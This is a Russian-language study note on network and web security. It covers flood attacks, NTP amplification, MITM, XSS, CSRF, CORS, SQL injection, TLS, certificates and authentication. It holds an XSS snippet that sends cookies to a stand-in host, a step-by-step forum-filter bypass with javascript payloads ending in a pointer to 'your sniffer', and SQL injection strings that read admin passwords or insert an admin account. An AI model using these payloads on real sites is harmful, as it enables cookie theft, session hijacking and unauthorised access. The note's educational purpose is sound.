# Безопасность передачи данных

## Угрозы в сети

### DDoSDoS-атака (Denial of Service)

Закидывание неугодных ресурсов различным флудом, приводящее их к нокдауну. Если атака выполняется одновременно с
большого числа компьютеров, говорят о DDoS-атаке (Distributed Denial of Service).

Классификация:

### HTTP-флуд

Атакующий шлёт маленький по объёму HTTP-пакет, но такой, чтобы сервер ответил на него пакетом, размер которого в сотни
раз больше. Передаваемые заголовки могут варьироваться, что делает сложнее задачу выявления атаки. Использование HTTPS
так же усложняет задачу, т.к. для выполнения запроса его нужно сначала расшифровать, а на это так же тратятся ресурсы.

Защита: установить перед web-сервером nginx для кэширования запросов.

#### UDP-флуд

Злоумышленник отправляет большое количество пакетов на сервер с целью превысить пропукную способность оборудования.
Атака состоит из следующих шагов:

1. сервер получает UDP пакет на какой-то порт;
1. проверяет есть ли программа, которая слушает этот порт;
1. если программы нет, то сервер отвечает ICMP (ping) что `destination was unreachable`.

![UDP flood](images/udp_flood.png)

Защита: выставляет firewall, который режет UDP пакеты ко всем портам, кроме тех, на которых запущены приложения.

#### ICMP-флуд

Как и в случае с UPD, атака направлена на превышение пропускной способости оборудования. Атака симметричная, адрес
отпарвителя обычно не маскируется. Для атаки часто используются устройства интернета вещей с большой пропускной
способностью (например, IP камеры).

![ICMP flood](images/icmp_flood.png)

Защита: для того, чтобы защититься от ICMP-флуда нужно отключить ответы на запросы ICMP ECHO.

#### SYN-флуд

Для описания её действия можно остановиться на рассмотрении двух систем А и В, которые хотят установить между собой TCP
соединение, после которого они смогут обмениваться между собой данными. На установку соединения выделяется некоторое
количество ресурсов, этим и пользуются DoS-атаки. Отправив несколько ложных запросов, можно израсходовать все ресурсы
системы, отведённые на установление соединения. Рассмотрим подробнее, как это происходит. Хакер с системы А отправляет
пакет SYN системе В, но предварительно поменяв свой IP-адрес на несуществующий. Затем, ничего не подозревая, компьютер В
отправляет ответ SYN/ACK на несуществующий IP-адрес и переходит в состояние SYN-RECEIVED. Так как сообщение SYN/ACK не
дойдет до системы А, то компьютер В никогда не получит пакет с флагом ACK. Данное потенциальное соединение будет
помещено в очередь, из которой оно будет удалено по истечению какого-то времени. Этим пользуются злоумышленники и
отправляют сразу несколько пакетов SYN на компьютер жертвы, чтобы полностью исчерпать ресурсы системы.

![SYN flood](images/syn_flood.png)

Защита: отключение очереди "полуоткрытых" TCP-соединений.

#### Отраженная атака

Атака использует протокол синхронизации времени NTP для переполнения пропускной способности сети. В атаке NTP
используются как усиливающие сервера. На них делается запрос `monlist`, а адрес ответа подменяется на адрес атакуемого
сервиса. Атака состоит из следующих шагов:

1. Злоумышленник использует ботнет для отправки UDP-пакетов с поддельными ip адресами на NTP сервер, на котором включена
   команда `monlist`. Поддельный IP адрес в каждом пакете указывает на настоящий ip адрес жертвы.
1. Каждый пакет UDP делает запрос к серверу NTP с помощью своей команды `monlist`, что приводит к большому отклику.
1. Затем сервер отвечает на поддельный адрес полученными данными.
1. IP адрес цели получает ответ, и окружающая сетевая инфраструктура оказывается перегруженной потоком трафика, что
   приводит к отказу в обслуживании.

```
monlist is a debugging command that allows to retrieve information from the monitoring facility about traffic
associated with the NTP service.

The reference implementation of NTP [...] allows users to request a list of hosts with which the NTP daemon ntpd
communicated recently. The list, called "monlist" has a size limit of 600 entries and contains the IP addresses
of the last NTP clients or servers the instance has talked to.
```

![NTP attack](images/ntp_attack.png)

[What was/is the purpose of the 'MONLIST' command in NTP?](https://security.stackexchange.com/a/151451)

Защита:

1. Отключаем команду `monlist`.
1. Включаес фильтрацию входного траффика, т.к. внешний входящий запрос имеет ip адрес жертвы внутри сети.

### Main-In-The-Middle

Атака посредника или атака Man in the middle (MITM) — вид атаки в криптографии, когда злоумышленник перехватывает и
подменяет сообщения, которыми обмениваются корреспонденты, причём ни один из последних не догадывается о его присутствии
в канале. Используется для прослушки или подмены передаваемых сообщений.

### XSS

XSS атаки – представляет собой уязвимость web-приложений, которая позволяет внедрение вредоносного кода в WEB-страницы,
просматриваемые другими пользователями. XSS атаки - это атаки не на сам сайт, а на пользователей сайта. Чаще всего XSS
используют для кражи Cookies, т.к. в них иногда хранят какую-нибудь ценную информацию (иногда даже логин и пароль (или
его хэш) пользователя), но самой опасной является кража активной сессии.

Делается это с помощью кода:

```javascript
<script>
    var іmg = new Image();
    іmg.srс = 'http://site/xss.php?' + document.cookie;
</script>
```

Так же подобной механикой можно добиться простой DDoS атаки на некоторый сайт:

```html
<img alt="simple image" src="http://site.com/">
```

Существует два типа XSS уязвимостей — пассивная и активная.

* Пассивные - это XSS, которые требуют от жертвы непосредственного участия. Например, заставить пользователя перейти по
  ссылке: `http://www.site.com/page.php?var=<script>document.cookie</script>`.
* Активные - это XSS, которые, не требуют никаких дополнительных действий со стороны жертвы – ей достаточно лишь открыть
  страницу с вашим XSS и js выполнится автоматически.

К примеру просмотрим форум на наличие использования тегов [font],[img],[url] и попытаться вставить в них скрипт или
комбинировать их:

```html
[img]https://...ru/1.jpg[/img]
```

Если выходит крестик, значит img используется и мы его подобрали. Если крестика нет, а висит всего надпись, то
попробуйте еще так:

```html
[img src=https://...ru/1.jpg]
```

Предположим, мы добились крестика этим:

```html
[img]https://...ru/1.jpg[/img]
```

Проверим держит ли фильтр пробел, добавляем пробел после расширения jpg:

```html
[img]https://...ru/1.jpg [/img]
```

Если крестик есть - тогда всё ОК. Далее существуют у img параметры dynsrc и lowsrc которые держат js. Пытаемся к примеру
вставить:

```html
[img]https://...ru/1.jpg dynsrc=javascript:alert()[/img]
```

Проверяем и отсылаем. Если появиться сообщение – значит нашли активную XSS и вместо `alert()` можете вставить любой
скрипт. Если фильтр не сдался попробуйте так:

```html
[img]https://...ru/"/dynsrc="javascript:alert()"/1.jpg[/img]
```

или

```html
[img]https://...ru/"/dynsrc=javascript:alert()/1.jpg[/img]
```

Если с приведённых примеров получился крестик, то `httрs://...ru/1.jpg` заменяем на адрес сниффера.

Примеры взяты из [Xss для новичков](https://forum.antichat.ru/threads/20140/)

### CSRF (Cross Site Request Forgery)

Вид атак на посетителей веб-сайтов, использующий недостатки протокола HTTP. Если жертва заходит на сайт, созданный
злоумышленником, от её лица тайно отправляется запрос на другой сервер, осуществляющий некую вредоносную операцию. Это
становится возможно потому что при запросе будут передаваться cookies, т.е. запрос будет воспринят как исходящий от
аутентифицированного пользователя. Cookie удостоверяют личность, но никак не гарантируют подлинность данных. Типичный
способ защиты сайтов – это секретный ключ – специальное значение, которое генерируется случайным образом и сохраняется в
сессии посетителя. Его знает только сервер, в браузере оно обычно хранится как скрытое поле на форме или в
Cookies.Спецификация протокола HTTP/1.1 определяет безопасные методы запросов, такие как GET, HEAD, которые не должны
изменять данные на сервере. Для таких запросов, при соответствии сервера спецификации, нет необходимости применять
защиту CSRF.

### CORS (Cross-origin resource sharing)

Концепция, позволяющая AJAX-запросам выполняться только в рамках своего домена (Same Origin Policy). Эта мера направлена
для предотвращения CSRF-атак через AJAX. Поскольку CSRF-токен генерируется на сервере, на стороне клиента нет
возможности подписать сообщение.В кросс-доменный запрос браузер автоматически добавляет заголовок `Origin`, содержащий
домен, с которого осуществлён запрос. Сервер должен, со своей стороны, ответить специальными заголовками, разрешает ли
он такой запрос к себе. Если сервер разрешает кросс-доменный запрос с этого домена – он должен добавить к ответу
заголовок `Access-Control-Allow-Origin`, содержащий домен запроса или звёздочку '*'. По умолчанию ajax может прочитать
из ответа только базовые заголовки:

* Cache-Control;
* Content-Language;
* Content-Type;
* Expires;
* Last-Modified;
* Pragma.

Чтобы он мог прочитать какой-то еще HTTP-заголовок, сервер должен указать его имя в `Access-Control-Expose-Headers`.

По умолчанию браузер не передаёт с запросом куки и авторизующие заголовки. Чтобы браузер передал вместе с запросом куки
и HTTP-авторизацию, нужно поставить запросу `xhr.withCredentials = true`, а сервер должен подтвердить, что он их примет
с помощью заголовка: `Access-Control-Allow-Credentials: true`. Использование звёздочки '*'
в `Access-Control-Allow-Origin` при этом запрещено.

### SQL Injection (Внедрение SQL)

В зависимости от типа используемой СУБД и условий внедрения, может дать возможность атакующему выполнить произвольный
запрос к базе данных (например, прочитать содержимое любых таблиц, удалить, изменить или добавить данные), получить
возможность чтения и/или записи локальных файлов и выполнения произвольных команд на атакуемом сервере.Примеры атак:

* **Внедрение в параметры** – допустим, у нас есть некоторый скрипт, проверяющий авторизацию пользователей:

```sql
SELECT *
FROM users
WHERE login = '$1'
  AND password = '$2';
```

Если введены корректные данные, то запрос выполнится корректно и пользователь сможет войти на сайт. Если же было
введено  `' or 1=1 --'`, то в запросы мы получим:

```sql
SELECT *
FROM users
WHERE login = '' AND password = ''
   OR 1 = 1 --';
```

что дает любому пользователю войти на сайт.

* **Использование UNION** – SQL позволяет объединять результаты нескольких запросов при помощи оператора UNION. В
  примерах выше мы можем передать в качестве параметра `' UNION SELECT username, password FROM admin`.

```sql
SELECT *
FROM users
WHERE login = '$1'
  AND password = ''
UNION
SELECT username, password
FROM admin
```

Если запрос возвращает одну колонку, то можно использовать group_concat().

* **Расщепление SQL запроса** - для разделения команд в языке SQL используется символ ';' (точка с запятой). Внедряя
  этот символ в запрос, злоумышленник получает возможность выполнить несколько команд в одном запросе. Например, в
  запрос выше мы можем передать: `'; insert int admin (username, password) values ('foo', 'bar'); --'`, то в одном
  запросе будут выполнены две команды

```sql
SELECT *
FROM users
WHERE login = '$1'
  AND password = '';
INSERT INTO admin (username, password)
VALUES ('foo', 'bar'); --'
```

и в таблицу admin будет несанкционированно добавлена запись `foo:bar`. Для защиты от данного типа атак необходимо
тщательно фильтровать входные параметры, значения которых будут использованы для построения SQL-запроса. Так же все
приходящие с формы параметры должны иметь соответствующий тип, т.е. если ожидается id сущности, то её тип должен быть
int, а не string.

## HTTPS

Любое действие в интернете — это обмен данными. Каждый раз, когда вы запускаете видеоролик, посылаете сообщение в
социальной сети или открываете сайт, ваш компьютер отправляет запрос к нужному серверу и получает от него ответ. Как
правило, обмен данными происходит по протоколу HTTP. Этот протокол не только устанавливает правила обмена информацией,
но и служит транспортом для передачи данных — с его помощью браузер загружает содержимое сайта на ваш компьютер или
смартфон. При всём удобстве и популярности HTTP у него есть один недостаток: данные передаются в открытом виде и никак
не защищены. На пути из точки А в точку Б информация в интернете проходит через десятки промежуточных узлов, и, если
хоть один из них находится под контролем злоумышленника, данные могут перехватить. Для установки безопасного соединения
используется протокол HTTPS с поддержкой шифрования. Защиту данных в HTTPS обеспечивает криптографический протокол
SSL/TLS, который шифрует передаваемую информацию. По сути этот протокол является обёрткой для HTTP. Он обеспечивает
шифрование данных и делает их недоступными для просмотра посторонними. Протокол SSL/TLS хорош тем, что позволяет двум
незнакомым между собой участникам сети установить защищённое соединение через незащищённый канал.

### TLS

TLS (Transport Layer Security) – это протокол защиты транспортного уровня. Он нужен для того, чтобы никто не мог вас
«прослушать» и узнать какую-то важную информацию (чаще всего пароли, если говорить о работе в сети). Установка
защищенного соединения делится на 3 этапа:

1. Согласование типа сертификата:
    1. Клиент отправляет Client Hello и перечисляет какие протоколы (cipher suites) он поддерживает, упорядоченные в
       приоритетном порядке.
    1. Клиент генерирует большое рандомное число (Random).
    1. В ответ сервер посылает Server Hello, где передает свою цепочку сертификатов, выбранный протокол и
       сгенерированное свое случайное число (Server Key Exchange).
    1. Клиент проверяет сертификат (цепочку подписей до корневого сертификата).
       ![Cipher Suite](images/cipher_suite.png)
1. Создание сессионного ключа:
    1. Если согласование ключей идет по протоколу RSA:
        1. После проверки протокола клиент генерирует pre-master ключ, шифрует его публичным ключом сервера и отправляет
           обратно.
        1. Сервер расшифровывает сообщение с помощью своего приватного ключа, на его основе строит Master Secret –
           генерируется из нескольких переменных составляющих: pre-master secret, ClientRandom и ServerRandom.
    1. Либо обмен ключами выполняется по протоколу Диффи-Хеллмана (сейчас стандарт).
1. Обмен зашифрованными данными.

Ниже показана наглядная схема обмена между двумя пользователями. Алиса и Боб хотят использовать общий ключ для
шифрования переписки.

![Key Exchange](images/key_exchange.png)
Рассмотрим детально этот процесс, используя краски вместо чисел:

1. Алиса и Боб выбрали общую краску;
1. Алиса и Боб выбрали по одной секретной краске;
1. Алиса и Боб смешали общую и секретную краску;
1. Алиса и Боб обменялись получившимися смешанными красками.
1. Алиса смешала полученную смешанную краску от Боба со своей секретной краской.
1. Боб смешал полученную смешанную краску от Алисы со своей секретной краской.
1. Теперь у Алисы и Боба есть общая секретная краска.

Обмен ключами на основе RSA имеет существенный недостаток: эта пара отрытого и закрытого ключей используется и для
аутентификации сервера. Соответственно, если злоумышленник получает доступ к закрытому ключу сервера, он может
расшифровать весь сеанс связи. Более того, злоумышленник может попросту записать весь сеанс связи в зашифрованном
варианте и занять расшифровкой потом, когда удастся получить закрытый ключ сервера. В то же время, обмен ключами
Диффи-Хеллмана представляется более защищённым, так как установленный симметричный ключ никогда не покидает клиента или
сервера и, соответственно, не может быть перехвачен злоумышленником, даже если тот знает закрытый ключ сервера. На этом
основана служба снижения риска компрометации прошлых сеансов связи: для каждого нового сеанса связи создаётся новый, так
называемый «временный» симметричный ключ. Соответственно, даже в худшем случае (если злоумышленнику известен закрытый
ключ сервера), злоумышленник может лишь получить ключи от будущих сессий, но не расшифровать ранее записанные.

### Сертификаты

Для гарантии того, что сервер является тем, за кого он себя выдает, являются цифровые сертификаты — электронный
документ, который использующийся для идентификации сервера. Сертификат подтверждает две вещи:

1. Лицо, которому он выдан, действительно существует.
1. Оно управляет сервером, который указан в сертификате.

Выдачей сертификатов занимаются центры сертификации. В сертификате содержатся данные о его владельце, в том числе имя (
или название организации), а также подпись, удостоверяющая подлинность сертификата. Web-браузер имеет встроенную систему
безопасности. В ходе этой процедуры web-браузер проверяет, чтобы:

* Доменное имя в сертификате соответствовало тому домену, от которого идет запрос на защищенное соединение.
* Сертификации, подписавший сертификат домена, входил в число доверенных вашего web-браузера.
* Сертификат не был просрочен.

Если вы пытаетесь зайти на web-сайт, который имеет проблемы с сертификатом, система безопасности может выдать
предупреждение. Пользователь будет информирован, что сайт использует защищенный протокол, однако никакая третья сторона
не гарантирует вам того, что вы работаете на web-сервере именно той компании, с которой хотите иметь дело и что Ваша
информация не будет получена кем-то другим. Обмен данными начинается только в том случае, если проверка прошла успешно.
Если вернуться к аналогии с ящиком и замками, цифровой сертификат позволяет убедиться в том, что замок вашего
собеседника на ящике принадлежит именно ему. Что это уникальный замок, который невозможно подделать. Таким образом, если
кто-то посторонний попытается вас обмануть и пришлёт ящик со своим замком, вы легко это поймёте, ведь замок будет
другой.

SSL-сертификаты делятся на:

* **Самоподписанные (Self-Signed)** – для тестирования на локальной машине можно создать самоподписанный
  сертификат. [How To Create a Self-Signed SSL Certificate for Nginx in Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-in-ubuntu-18-04)
  .
* **Сертификат, полученный в центре сертификации** – Центр сертификации (CA) – организация, обладающая правом выдачи
  цифровых сертификатов. Перед выдачей сертификата она проверяет данные, содержащиеся в нем. В самых простых
  сертификатах проверяется только соответствие доменного имени, в самых дорогих производится целый ряд проверок самой
  организации, которая запрашивает сертификат.

Сертификаты деляться по типу валидации:

* Сертификаты, которые подтверждают только доменное имя (Domain Validation — DV) – это самые простые сертификаты, это
  ваш выбор если сертификат вам нужен срочно, так как выпускаются они автоматически и моментально. При проверке такого
  сертификата отсылается письмо со специальной ссылкой, по которой нужно кликнуть, чтобы подтвердить выпуск сертификата.
* Сертификаты, которые подтверждают домен и организацию (Organization Validation — OV) – в таком сертификате уже будет
  указано название организации. После получения запроса на выпуск сертификата с проверкой организации центр сертификации
  производит проверку, реально ли существует такая организация, как указано в CSR и принадлежит ли ей указанный домен.

  ![OV digitalocean.com](images/ov_digitalocean.com.png)
* Сертификаты, с расширенной проверкой (Extended Validation — EV) – SSL сертификаты с расширенной проверкой (EV)
  выпускаются только когда центр сертификации (CA) выполняет две проверки, чтобы убедиться, что организация имеет право
  использовать определенный домен плюс центр сертификации выполняет тщательную проверку самой организации. Процесс
  выпуска сертификатов EV стандартизирован и должен строго соотвествовать правилам EV, которые были созданы на
  специализированном форуме CA/Browser Forum в 2007 году. Там указаны необходимые шаги, которые центр сертификации
  должен выполнить перед выпуском EV сертификата:
    * Должен проверить правовую, физическую и операционную деятельности субъекта.
    * Должен убедиться, что организация соответствует официальным документам.
    * Необходимо убедиться, что организация имеет исключительное право на использование домена, указанного в сертификате
      EV.
    * Необходимо убедиться, что организация полностью авторизована для выпуска EV сертификата.

  ![CV paypal.com](images/ev_paypal.com.png)

HTTPS не всегда обоснован, в основном для работы в локальной сети организации. При передаче информации по HTTPS нельзя
использовать кэширование, передается большее количество данных по сети и используется больше вычислительной мощности для
шифровки/расшифровки сообщений.

## Авторизация и Аутентификация

Идентификация — это заявление о том, кем вы являетесь. В зависимости от ситуации, это может быть имя, адрес электронной
почты, номер учетной записи, итд.

Аутентификация (Authentication – реальный, подлинный) – процесс подтверждения того, что сторона, заявившая о себе,
таковой на самом деле и является. Для человека аутентификация обычно сводится к набору имени и пароля. Предполагается,
что только этот человек имеет доступ к такой информации и потому лицо, набравшее её, и должно быть данным человеком.
Авторизация –  (Authorization — разрешение) — предоставление определённому лицу или группе лиц прав на выполнение
определённых действий, а также процесс проверки (подтверждения) данных прав при попытке выполнения этих действий.

### Способы аутентификации

* **Аутентификация по паролю**.
* **HTTP authentication** – сервер, при обращении неавторизованного клиента к защищенному ресурсу, отсылает HTTP
  статус `401 Unauthorized` и добавляет заголовок `WWW-Authenticate` с указанием схемы и параметров аутентификации.
  Браузер, при получении такого ответа, автоматически показывает диалог ввода username и password. Пользователь вводит
  детали своей учетной записи. Во всех последующих запросах к этому веб-сайту браузер автоматически добавляет HTTP
  заголовок `Authorization`, в котором передаются данные пользователя для аутентификации сервером.
    * Basic — наиболее простая схема, при которой username и password пользователя передаются в заголовке Authorization
      в незашифрованном виде (base64-encoded).
    * Digest — challenge-response-схема, при которой сервер посылает уникальное значение nonce, а браузер передает MD5
      хэш пароля пользователя, вычисленный с использованием указанного nonce. Более безопасная альтернативв Basic схемы
      при незащищенных соединениях. Но использование этой схемы не позволяет применить современные хэш-функции для
      хранения паролей пользователей на сервере.
* **Аутентификация по сертификатам** – сертификат представляет собой набор атрибутов, идентифицирующих владельца,
  подписанный Certificate Authority (CA). CA выступает в роли посредника, который гарантирует подлинность сертификатов (
  по аналогии с ФМС, выпускающей паспорта).
* **Social login** – способ аутентификации, при котором информацию о пользователе получаем из социальных сетей.
* **Аутентификация по одноразовым паролям**.
    * Аппаратные или программные токены, которые могут генерировать одноразовые пароли на основании секретного ключа,
      введенного в них, и текущего времени. Секретные ключи пользователей, являющиеся фактором владения, также хранятся
      на сервере, что позволяет выполнить проверку введенных одноразовых паролей.
    * Случайно генерируемые коды, передаваемые пользователю через SMS или другой канал связи. Например, через Google
      Authenticator.
    * Распечатка или scratch card со списком заранее сформированных одноразовых паролей. Для каждого нового входа в
      систему требуется ввести новый одноразовый пароль с указанным номером.
* **Token-Based Authorization** – авторизованный пользователь создает специальный ключ, который будет выступать в роли
  подтверждения логина/пароля. Обычно имеет ограниченный набор операций и выступает как замена пароля. Часто передается
  в заголовке вида `Authorization: Bearer <token>`.
* **Двухфакторная авторизация** – помимо логина и пароля используется подтвержение одноразовым паролем, способы
  получения которых описаны выше.
* **Single Sign On (SSO)** – единая платформа авторизации, которая дает доступ к различным ресурсам экосистемы.
  Например, при авторизации на одном из сервисов Google, у вас поялвется доступ до других сервисов без необходимости
  повторно проходить авторизацию.

## Литература

1. [Защита сервера от DDoS-атак](https://itelon.ru/blog/zashchita-servera-ot-ddos-atak/)
1. [What is a Ping (ICMP) flood attack?](https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/)
1. [What is a SYN flood attack?](https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/)
1. [What is a NTP amplification attack?](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/)
1. [Xss для новичков](https://forum.antichat.ru/threads/20140/)
1. [Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
1. [Атака CSRF](https://learn.javascript.ru/csrf)
1. [Что такое протокол HTTPS, и как он защищает вас в интернете](https://yandex.ru/blog/company/77455)